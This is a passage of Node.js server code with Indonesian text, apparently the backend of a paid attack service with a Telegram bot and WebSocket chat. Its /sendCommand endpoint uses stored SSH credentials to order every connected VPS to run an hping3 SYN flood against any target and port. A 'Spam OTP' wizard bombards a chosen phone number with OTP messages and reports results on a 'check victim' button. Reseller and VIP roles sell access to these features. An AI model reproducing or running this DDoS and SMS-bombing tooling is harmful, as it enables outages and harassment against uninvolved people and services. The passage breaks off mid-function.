        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (isPublicChatSocket) {
      publicChatSockets.delete(ws);
    }
    if (isStorySocket) {
      storySockets.delete(ws);
    }

    if (ws.username) {
      onlineUsers.delete(ws.username);
      broadcastStats();
    }
    if (ws.interval) clearInterval(ws.interval);
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

const wsPort = 3018;
server.listen(wsPort, () => {
  console.log(`✅ Server running on http://herganteng.r-cloud.my.id:${wsPort}`);
  console.log(`✅ WebSocket also on port ${wsPort}`);
});

const PORT = 3018;

const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[ RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log(" activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error(" Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log(" Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(` Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(` Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(` Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(` Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(` Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log(" Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log(" VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log(" VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    console.error(" Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  try {
    const keyInfo = activeKeys[key];
    if (!keyInfo || !keyInfo.username) return null;  // ← GUARD

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    return user ? keyInfo.username : null;
  } catch (e) {
    console.error('[getUserByKey]', e.message);
    return null;
  }
}

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(` Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(` Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(` Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function saveTelegramConfig(data) {
  fs.writeFileSync(telegramDataPath, JSON.stringify(data, null, 2));
}

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[ GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[ EXP] ${user.username} expired:`, expired);
  return expired;
}

// ========== SPAM OTP STATE & PREMIUM ==========
const spamWizardState = new Map(); // key: userId, value: { step, phone, lastResult }

// ─── WIZARD CEK BANNED VIP ──────────────────────────────────────────
const bannedWizardState = new Map(); // userId -> { step, messageId, chatId, phone, progressMsgId }

const PREMIUM_SPAM_FILE = path.join(__dirname, 'premium_spam.json');

function loadPremiumSpamUsers() {
    try {
        if (!fs.existsSync(PREMIUM_SPAM_FILE)) {
            fs.writeFileSync(PREMIUM_SPAM_FILE, JSON.stringify([], null, 2));
            return [];
        }
        const data = fs.readFileSync(PREMIUM_SPAM_FILE, 'utf8');
        const parsed = JSON.parse(data);
        return Array.isArray(parsed) ? parsed : [];
    } catch {
        return [];
    }
}

function savePremiumSpamUsers(users) {
    fs.writeFileSync(PREMIUM_SPAM_FILE, JSON.stringify(users, null, 2));
}

function isPremiumSpamUser(telegramId) {
    const users = loadPremiumSpamUsers();
    return users.includes(telegramId);
}

function addPremiumSpamUser(telegramId) {
    const users = loadPremiumSpamUsers();
    if (!users.includes(telegramId)) {
        users.push(telegramId);
        savePremiumSpamUsers(users);
        return true;
    }
    return false;
}

function removePremiumSpamUser(telegramId) {
    let users = loadPremiumSpamUsers();
    const filtered = users.filter(id => id !== telegramId);
    if (filtered.length !== users.length) {
        savePremiumSpamUsers(filtered);
        return true;
    }
    return false;
}

// ========== ADDIZIN STATE & HELPERS ==========
const addizinWizardState = new Map(); // key: Telegram ID, value: { step, selectedRole, targetId, targetUsername, instructionMessageId }

const ADDIZIN_USERS_FILE = path.join(__dirname, 'addizin_users.json');

// ─── Pastikan file ada dan isinya array ───
function ensureAddizinFile() {
    try {
        if (!fs.existsSync(ADDIZIN_USERS_FILE)) {
            fs.writeFileSync(ADDIZIN_USERS_FILE, JSON.stringify([], null, 2));
            console.log('[ADDIZIN] File dibuat');
            return true;
        }
        const data = fs.readFileSync(ADDIZIN_USERS_FILE, 'utf8');
        const parsed = JSON.parse(data);
        if (!Array.isArray(parsed)) {
            console.warn('[ADDIZIN] File korup, reset ke array kosong');
            fs.writeFileSync(ADDIZIN_USERS_FILE, JSON.stringify([], null, 2));
            return false;
        }
        return true;
    } catch (e) {
        console.error('[ADDIZIN] Error baca file:', e.message);
        fs.writeFileSync(ADDIZIN_USERS_FILE, JSON.stringify([], null, 2));
        return false;
    }
}

// ─── Baca data user addizin (PASTIKAN ARRAY) ───
function loadAddizinUsers() {
    ensureAddizinFile();
    try {
        const data = fs.readFileSync(ADDIZIN_USERS_FILE, 'utf8');
        const parsed = JSON.parse(data);
        if (Array.isArray(parsed)) {
            return parsed;
        }
        return [];
    } catch (e) {
        console.error('[ADDIZIN] Gagal baca file:', e.message);
        return [];
    }
}

// ─── Simpan data user addizin ───
function saveAddizinUsers(users) {
    if (!Array.isArray(users)) {
        console.error('[ADDIZIN] Data bukan array, tidak disimpan');
        return;
    }
    try {
        fs.writeFileSync(ADDIZIN_USERS_FILE, JSON.stringify(users, null, 2));
    } catch (e) {
        console.error('[ADDIZIN] Gagal simpan file:', e.message);
    }
}

// ─── Cari user berdasarkan telegramId ───
function getUserByTelegramId(telegramId) {
    // Cari di addizin_users.json dulu
    const addizinUsers = loadAddizinUsers();
    let user = addizinUsers.find(u => u.telegramId === telegramId);
    if (user) return user;

    // Jika tidak ada, cari di database.json
    try {
        const db = loadDatabase();
        return db.find(u => u.telegramId === telegramId);
    } catch {
        return null;
    }
}

// ─── Tambah/update user ke addizin_users.json ───
function upsertAddizinUser(telegramId, username, role, addedBy) {
    const users = loadAddizinUsers();
    const existing = users.find(u => u.telegramId === telegramId);
    if (existing) {
        existing.role = role;
        existing.username = username || existing.username;
        existing.updatedBy = addedBy;
        existing.updatedAt = new Date().toISOString();
    } else {
        users.push({
            telegramId: telegramId,
            username: username || 'Unknown',
            role: role,
            addedBy: addedBy || 'System',
            addedAt: new Date().toISOString(),
            updatedAt: new Date().toISOString()
        });
    }
    saveAddizinUsers(users);
    return true;
}

// ─── Cek apakah user sudah terdaftar ───
function isAddizinUser(telegramId) {
    const users = loadAddizinUsers();
    return users.some(u => u.telegramId === telegramId);
}

// ─── Daftar role yang tersedia ───
const ADDIZIN_ROLES = [
    'reseller', 'tukang_bubur', 'vip', 'member',
    'admin', 'partner', 'partner_pribadi', 'developers',
    'tangan_kiri', 'tangan_kanan', 'ceo_utama',
    'moderator', 'forius_utama', 'executorius',
    'staff', 'owner', 'owner_utama'
];

// ─── ROLE_HIERARCHY ───
const ROLE_HIERARCHY = {
    owner_utama: ['owner', 'staff', 'executorius', 'forius_utama', 'moderator', 'ceo_utama', 'tangan_kanan', 'tangan_kiri', 'developers', 'partner_pribadi', 'partner', 'admin', 'reseller', 'tukang_bubur', 'vip', 'member'],
    owner: ['staff', 'executorius', 'forius_utama', 'moderator', 'ceo_utama', 'tangan_kanan', 'tangan_kiri', 'developers', 'partner_pribadi', 'partner', 'admin', 'reseller', 'tukang_bubur', 'vip', 'member'],
    staff: ['admin', 'partner', 'reseller', 'tukang_bubur', 'vip', 'member'],
    partner: ['moderator', 'ceo_utama', 'tangan_kanan', 'admin', 'reseller', 'vip', 'member'],
    admin: ['reseller', 'tukang_bubur', 'vip', 'member'],
    reseller: ['vip', 'member'],
    vip: ['member']
};

// ─── Pengecekan akses owner (hanya dari telegram.json) ───
function isOwnerByTelegramId(telegramId) {
    return telegramIsOwner(telegramId);
}

// ─── Role yang dapat diberikan ───
function getAssignableRoles(ownerRole) {
    return ROLE_HIERARCHY[ownerRole] || [];
}

// ─── Tampilkan pemilihan role ───
async function showRoleSelector(chatId, messageId, userId, targetUser) {
    // Coba cari owner di database addizin atau database.json
    let ownerUser = getUserByTelegramId(userId);
    
    // Jika owner tidak ditemukan di database, cek apakah dia owner dari telegram.json
    if (!ownerUser) {
        if (telegramIsOwner(userId)) {
            // Buat dummy owner dengan role owner_utama agar bisa melanjutkan
            ownerUser = {
                username: 'Owner',
                role: 'owner_utama',
                telegramId: userId
            };
            console.log('[ADDIZIN] Owner dummy dibuat untuk userId:', userId);
        } else {
            return bot.sendRichMessage(chatId, '❌ Anda tidak memiliki akses sebagai owner.', { parse_mode: "HTML" });
        }
    }

    const allowedRoles = getAssignableRoles(ownerUser.role);
    if (allowedRoles.length === 0) {
        return bot.sendRichMessage(chatId, '❌ Anda tidak memiliki izin untuk memberikan role apapun.', { parse_mode: "HTML" });
    }

    const rows = [];
    for (let i = 0; i < allowedRoles.length; i += 2) {
        const row = [];
        const role1 = allowedRoles[i];
        row.push({
            text: role1.toUpperCase(),
            callback_data: `addizin_role_${role1}`,
            style: role1 === 'owner_utama' ? 'danger' : 'primary'
        });
        if (i + 1 < allowedRoles.length) {
            const role2 = allowedRoles[i + 1];
            row.push({
                text: role2.toUpperCase(),
                callback_data: `addizin_role_${role2}`,
                style: role2 === 'owner_utama' ? 'danger' : 'primary'
            });
        }
        rows.push(row);
    }
    rows.push([{ text: "❌ BATAL", callback_data: "addizin_cancel", style: "danger" }]);

    const keyboard = { inline_keyboard: rows };

    const preview = `
👤 <b>PREVIEW USER</b>

Username: <b>${targetUser.username || 'Tidak diketahui'}</b>
Telegram ID: <b>${targetUser.telegramId}</b>
Role saat ini: <b>${targetUser.role || 'belum ada'}</b>
Status: ${targetUser.addedAt ? 'TERDAFTAR di ADDIZIN' : 'TIDAK TERDAFTAR (dari database)'}
Dibuat oleh: <b>${targetUser.addedBy || 'Sistem'}</b>
Expired: <b>${targetUser.expiredDate || 'Tidak terbatas'}</b>

Pilih role yang akan diberikan:
    `;

    await bot.editMessageText(preview, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: keyboard
    });
}

// ADD WIZARD
const deleteWizardState = new Map();
const USERS_PER_PAGE = 10;

// ─── TAMPILKAN HALAMAN DELETE USER ──────────────────────────────────
async function showDeleteUserPage(chatId, messageId, userId, page) {
  const state = deleteWizardState.get(userId);
  if (!state) return;

  const { users, totalPages } = state;
  const start = (page - 1) * USERS_PER_PAGE;
  const end = Math.min(start + USERS_PER_PAGE, users.length);
  const pageUsers = users.slice(start, end);

  // Buat tombol untuk setiap user
  const rows = pageUsers.map(username => {
    // Ambil role user untuk warna (opsional)
    const db = loadDatabase();
    const user = db.find(u => u.username === username);
    const role = user?.role || 'member';
    let style = 'primary';
    if (role === 'owner_utama' || role === 'owner') style = 'danger';
    else if (role === 'vip' || role === 'admin' || role === 'partner') style = 'success';

    return [{ text: `👤 ${username}`, callback_data: `del_user_${username}`, style }];
  });

  // Tombol navigasi
  const navRow = [];
  if (page > 1) {
    navRow.push({ text: "⬅️ SEBELUMNYA", callback_data: `del_page_${page-1}`, style: "primary" });
  }
  if (page < totalPages) {
    navRow.push({ text: "➡️ SELANJUTNYA", callback_data: `del_page_${page+1}`, style: "primary" });
  }
  if (navRow.length > 0) rows.push(navRow);

  // Tombol batal
  rows.push([{ text: "❌ BATAL", callback_data: "del_cancel", style: "danger" }]);

  const keyboard = { inline_keyboard: rows };

  const caption = `
🗑️ <b>HAPUS AKUN</b>

Halaman ${page} dari ${totalPages}
Total user: ${users.length}

Klik username untuk menghapus akun.
  `;

  // Cek apakah pesan sudah ada (edit) atau kirim baru
  if (messageId) {
    await bot.editMessageText(caption, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "HTML",
      reply_markup: keyboard
    });
  } else {
    await bot.sendRichMessage(chatId, caption, {
      parse_mode: "HTML",
      reply_markup: keyboard
    });
  }
}

// ========== BROADCAST STATE & HELPERS ==========
const BROADCAST_TARGETS_FILE = path.join(__dirname, 'broadcast_targets.json');
const pendingBroadcast = new Map(); // key: userId, value: { targetType, step }

// ─── Pastikan file targets ada ───
function ensureBroadcastFile() {
    try {
        if (!fs.existsSync(BROADCAST_TARGETS_FILE)) {
            fs.writeFileSync(BROADCAST_TARGETS_FILE, JSON.stringify({ groups: [], users: [], channels: [] }, null, 2));
            console.log('[BROADCAST] File targets dibuat');
        }
    } catch (e) {
        console.error('[BROADCAST] Gagal buat file:', e.message);
    }
}
ensureBroadcastFile();

// ─── Load broadcast targets ───
function loadBroadcastTargets() {
    try {
        const data = fs.readFileSync(BROADCAST_TARGETS_FILE, 'utf8');
        const parsed = JSON.parse(data);
        if (typeof parsed === 'object' && parsed !== null) {
            return {
                groups: Array.isArray(parsed.groups) ? parsed.groups : [],
                users: Array.isArray(parsed.users) ? parsed.users : [],
                channels: Array.isArray(parsed.channels) ? parsed.channels : []
            };
        }
        return { groups: [], users: [], channels: [] };
    } catch (e) {
        console.error('[BROADCAST] Gagal baca file:', e.message);
        return { groups: [], users: [], channels: [] };
    }
}

// ─── Save broadcast targets ───
function saveBroadcastTargets(data) {
    try {
        fs.writeFileSync(BROADCAST_TARGETS_FILE, JSON.stringify(data, null, 2));
    } catch (e) {
        console.error('[BROADCAST] Gagal simpan file:', e.message);
    }
}

// ─── Add chat ID ke target list ───
function addBroadcastTarget(chatId, chatType) {
    const targets = loadBroadcastTargets();
    const chatIdStr = chatId.toString();
    let list;
    if (chatType === 'group' || chatType === 'supergroup') {
        list = targets.groups;
        chatType = 'group';
    } else if (chatType === 'private') {
        list = targets.users;
    } else if (chatType === 'channel') {
        list = targets.channels;
    } else {
        return; // unknown type, ignore
    }
    if (!list.includes(chatIdStr)) {
        list.push(chatIdStr);
        saveBroadcastTargets(targets);
        console.log(`[BROADCAST] Target ${chatType} ${chatId} ditambahkan.`);
    }
}

// ─── PROSES PEMBUATAN AKUN SETELAH ADMIN PILIH ROLE & DURASI ──
// FIXED: Password tidak ditampilkan di group, hanya di private chat user
async function processCreateAccount(chatId, messageId, targetUserId, role, daysValue, requestData) {
  return withCreateAccountLock(targetUserId, async () => {
    try {
      const mode = requestData.mode || 'auto';
      const userData = requestData.data || null;
      const selectedRole = String(role || userData?.role || 'member').toLowerCase();
      const selectedDays = Number(daysValue);

      if (!ROLE_NAMES.includes(selectedRole)) {
        throw new Error('ROLE_INVALID');
      }
      if (!Number.isInteger(selectedDays) || selectedDays < 0 || selectedDays > 36500) {
        throw new Error('DURATION_INVALID');
      }

      let username = mode === 'manual' && userData?.username
        ? String(userData.username).trim()
        : `user_${targetUserId}`;
      let password = mode === 'manual' && userData?.password
        ? String(userData.password)
        : crypto.randomBytes(12).toString('base64url');

      const now = new Date();
      const expired = new Date(now);
      let expiredDisplay;
      if (selectedDays === 0) {
        expired.setFullYear(expired.getFullYear() + 100);
        expiredDisplay = '♾️ PERMANEN';
      } else {
        expired.setDate(expired.getDate() + selectedDays);
        expiredDisplay = expired.toISOString().slice(0, 10);
      }

      const mutation = await withCreateAccountDbLock(async () => {
        const db = loadDatabase();
        const usernameExists = value => db.some(user => String(user.username || '').toLowerCase() === value.toLowerCase());

        if (usernameExists(username)) {
          if (mode !== 'auto') return { created: false, reason: 'USERNAME_EXISTS' };
          do {
            username = `user_${targetUserId}_${Date.now().toString(36)}_${crypto.randomBytes(3).toString('hex')}`;
          } while (usernameExists(username));
        }

        const newUser = {
          username,
          password,
          role: selectedRole,
          expiredDate: expired.toISOString().slice(0, 10),
          telegramId: targetUserId,
          createdByTelegram: requestData.approvedByTelegram || targetUserId,
          createdAt: now.toISOString(),
          freeAccount: mode === 'auto'
        };

        db.push(newUser);
        saveDatabaseAtomicCreate(db);
        return { created: true, newUser };
      });

      if (!mutation.created) {
        await bot.editRichMessage(
          createAccountRich('CREATE TIDAK DAPAT DILANJUTKAN',
            `${createUiEmoji(CREATE_UI_EMOJI.user, '👤')} Username <code>${escapeHtml(username)}</code> sudah digunakan.\n\nPilih request baru untuk melanjutkan.`),
          { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔄 CREATE LAGI', callback_data: 'create_account', style: 'primary' }]] } }
        );
        pendingCreateRequests.delete(targetUserId);
        return mutation;
      }

      const credentialMessage = createAccountRich('ACCOUNT READY', [
        `<blockquote>${createUiEmoji(CREATE_UI_EMOJI.check, '✅')} <b>Succes Mengirim</b></blockquote>`,
        `${createUiEmoji(CREATE_UI_EMOJI.user, '👤')} <b>Username</b> : <code>${escapeHtml(username)}</code>`,
        `${createUiEmoji(CREATE_UI_EMOJI.lock, '🔐')} <b>Password</b> : <code>${escapeHtml(password)}</code>`,
        `${createUiEmoji(CREATE_UI_EMOJI.spark, '👑')} <b>Role</b> : <b>${escapeHtml(selectedRole.toUpperCase())}</b>`,
        `${createUiEmoji(CREATE_UI_EMOJI.clock, '⏳')} <b>Aktif</b> : <b>${escapeHtml(expiredDisplay)}</b>`,
        '',
        `<blockquote>${createUiEmoji(CREATE_UI_EMOJI.rocket, '🚀')} Login dengan data di atas. Jangan bagikan password.</blockquote>`
      ].join('\\n'));

      let privateDelivery = true;
      try {
        await bot.sendRichMessage(targetUserId, credentialMessage, { parse_mode: 'HTML' });
      } catch (deliveryError) {
        privateDelivery = false;
        console.error('[CREATE] Credential delivery failed:', deliveryError?.message || deliveryError);
      }

      const statusText = privateDelivery ? 'ACCOUNT CREATED' : 'ACCOUNT CREATED • DELIVERY RETRY';
      const adminBody = [
        `${createUiEmoji(CREATE_UI_EMOJI.check, '✅')} <b>Succes Mengirim</b>`,
        `${createUiEmoji(CREATE_UI_EMOJI.user, '👤')} <b>User</b> : <code>${escapeHtml(requestData.username || username)}</code>`,
        `${createUiEmoji(CREATE_UI_EMOJI.spark, '👑')} <b>Role</b> : <b>${escapeHtml(selectedRole.toUpperCase())}</b>`,
        `${createUiEmoji(CREATE_UI_EMOJI.clock, '⏳')} <b>Aktif</b> : <b>${escapeHtml(expiredDisplay)}</b>`,
        `${createUiEmoji(CREATE_UI_EMOJI.lock, '🔐')} <b>Password</b> : <i>${privateDelivery ? 'terkirim private' : 'belum terkirim'}</i>`
      ].join('\\n');

      await bot.editRichMessage(createAccountRich(statusText, adminBody), {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '👤 Chat User', url: `tg://user?id=${Number(targetUserId)}` }],
            [{ text: '➕ CREATE LAGI', callback_data: 'create_account', style: 'success' }, { text: '🏠 MENU', callback_data: 'mainmenu', style: 'primary' }]
          ]
        }
      });

      saveUserLog(username, 'create_account', `Akun dibuat via admin (${mode})`, `Role: ${selectedRole} | Durasi: ${selectedDays === 0 ? 'PERMANEN' : `${selectedDays} hari`} | Delivery: ${privateDelivery ? 'sent' : 'retry-needed'}`);
      pendingCreateRequests.delete(targetUserId);
      return { created: true, username, privateDelivery };
    } catch (err) {
      console.error('[PROCESS CREATE ACCOUNT]', err);
      await bot.editRichMessage(
        createAccountRich('CREATE BELUM SELESAI', `${createUiEmoji(CREATE_UI_EMOJI.shield, '🛡️')} Request tetap aman. Silakan ulangi dari menu <b>CREATE AKUN</b>.`),
        { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔄 COBA LAGI', callback_data: 'create_account', style: 'primary' }], [{ text: '🏠 MENU', callback_data: 'mainmenu', style: 'primary' }]] } }
      ).catch(() => {});
      return { created: false, reason: err?.message || 'CREATE_FAILED' };
    }
  });
}

// ─── JALANKAN PROSES SPAM OTP ─────────────────────────────────────
async function runSpamProcess(chatId, userId, phone) {
    const state = spamWizardState.get(userId);
    if (!state) return;

    // Kirim pesan progress awal
    const progressMsg = await bot.sendRichMessage(chatId, `
⏳ <b>Memulai Spam OTP...</b>

📱 <b>Nomor:</b> ${phone}
🔄 <b>Progress:</b> 0%
    `, { parse_mode: "HTML" });

    let progress = 0;
    const totalSteps = 30;
    const interval = setInterval(async () => {
        progress += 1;
        if (progress > totalSteps) {
            clearInterval(interval);
            return;
        }
        const percent = Math.min(Math.round((progress / totalSteps) * 100), 100);
        const bar = '▓'.repeat(Math.floor(percent / 5)) + '░'.repeat(20 - Math.floor(percent / 5));
        try {
            await bot.editMessageText(`
⏳ <b>Memproses Spam OTP...</b>

📱 <b>Nomor:</b> ${phone}
🔄 <b>Progress:</b> ${percent}%
\`${bar}\`
            `, {
                chat_id: chatId,
                message_id: progressMsg.message_id,
                parse_mode: "HTML"
            });
        } catch (_) {}
    }, 1200);

    try {
        // ============================================================
        // 🔥 PEMANGGILAN SPAM OTP ADA DI SINI
        // ============================================================
        const results = await spamOtp(phone);
        // ============================================================

        clearInterval(interval);

        await bot.editMessageText(`
⏳ <b>Spam Selesai!</b>

📱 <b>Nomor:</b> ${phone}
🔄 <b>Progress:</b> 100%
\`▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\`
        `, {
            chat_id: chatId,
            message_id: progressMsg.message_id,
            parse_mode: "HTML"
        });

        state.lastResult = results;
        state.phone = phone;
        spamWizardState.set(userId, state);

        const successCount = results.filter(r => r.status === 'success').length;
        const failCount = results.filter(r => r.status === 'failed' || r.status === 'error').length;
        const total = results.length;

        const keyboard = {
            inline_keyboard: [
                [{ text: "📊 CEK KORBAN", callback_data: "spam_cek_korban", style: "primary" }],
                [{ text: "📱 SPAM LAGI", callback_data: "spam_start", style: "success" }],
                [{ text: "📋 MENU UTAMA", callback_data: "mainmenu", style: "primary" }]
            ]
        };

        await bot.sendRichMessage(chatId, `
✅ <b>SPAM OTP SELESAI</b>

📱 <b>Nomor:</b> ${phone}
✅ <b>Berhasil:</b> ${successCount}
❌ <b>Gagal:</b> ${failCount}
📦 <b>Total:</b> ${total}

Klik tombol di bawah untuk melihat detail.
        `, {
            parse_mode: "HTML",
            reply_markup: keyboard
        });

    } catch (error) {
        clearInterval(interval);
        console.error('[SPAM OTP] Error:', error);
        await bot.editMessageText(`
❌ <b>Terjadi kesalahan</b>
${error.message || 'Gagal menjalankan spam OTP.'}
        `, {
            chat_id: chatId,
            message_id: progressMsg.message_id,
            parse_mode: "HTML"
        });
    }
}

// ============================================================
// PUBLIC CHAT API — COMPATIBLE WITH chat_room_page.dart
// ============================================================

function getChatSessionKey(req) {
  const auth = String(req.headers.authorization || '');
  const bearer = auth.match(/^Bearer\s+(.+)$/i);
  return (
    String(req.body?.session_key || req.body?.sessionKey || '').trim() ||
    String(req.headers['x-session-key'] || '').trim() ||
    (bearer ? String(bearer[1]).trim() : '') ||
    String(req.query?.session_key || req.query?.sessionKey || '').trim()
  );
}

function authenticateChatRequest(req, username) {
  const sessionKey = getChatSessionKey(req);

  // The app normally sends its session key in X-Session-Key/Bearer.
  // If a key is supplied, it MUST be valid and belong to the username.
  if (sessionKey) {
    const keyInfo = activeKeys[sessionKey];
    if (!keyInfo || !keyInfo.username) {
      return { ok: false, status: 401, message: 'Invalid session' };
    }
    if (username && keyInfo.username !== username) {
      return { ok: false, status: 401, message: 'Username mismatch' };
    }
    return { ok: true, username: keyInfo.username, sessionKey };
  }

  // Public room can still be used when the app has no session key.
  // Username is required so messages are attributable.
  if (!username) {
    return { ok: false, status: 400, message: 'Username wajib diisi' };
  }

  return { ok: true, username, sessionKey: '' };
}

function makePublicChatMessage({ username, role, text, imageUrl = '' }) {
  const now = new Date();
  return {
    id: crypto.randomUUID ? crypto.randomUUID() : `${Date.now()}-${crypto.randomBytes(6).toString('hex')}`,
    username: sanitizePublicChat(username),
    role: sanitizePublicChat(role || 'member'),
    text: sanitizePublicChat(text),
    message: sanitizePublicChat(text), // compatibility with older clients
    imageUrl: String(imageUrl || ''),
    time: now.toISOString(),
    createdAt: now.toISOString(),
    timestamp: now.getTime()
  };
}

function broadcastPublicChat(message) {
  const payload = JSON.stringify({
    type: 'new_message',
    message
  });

  for (const ws of publicChatSockets) {
    try {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(payload);
      } else {
        publicChatSockets.delete(ws);
      }
    } catch (_) {
      publicChatSockets.delete(ws);
    }
  }
}

// GET /api/chat/messages
app.get('/api/chat/messages', (req, res) => {
  try {
    const requestedLimit = Number.parseInt(String(req.query.limit ?? '80'), 10);
    const limit = Math.max(1, Math.min(Number.isFinite(requestedLimit) ? requestedLimit : 80, 200));

    const messages = publicChatList
      .slice(-limit)
      .map((m, index) => ({
        id: String(m.id ?? `${m.time ?? Date.now()}-${index}`),
        username: String(m.username ?? m.from ?? 'User'),
        role: String(m.role ?? 'member'),
        text: String(m.text ?? m.message ?? m.content ?? ''),
        message: String(m.message ?? m.text ?? ''),
        imageUrl: String(m.imageUrl ?? m.image_url ?? ''),
        time: m.time ?? m.createdAt ?? new Date().toISOString(),
        createdAt: m.createdAt ?? m.time ?? new Date().toISOString(),
        timestamp: m.timestamp ?? (
          typeof m.time === 'number'
            ? m.time
            : new Date(m.time ?? Date.now()).getTime()
        ),
        reactions: m.reactions && typeof m.reactions === 'object' ? m.reactions : {}
      }));

    return res.status(200).json({
      success: true,
      messages,
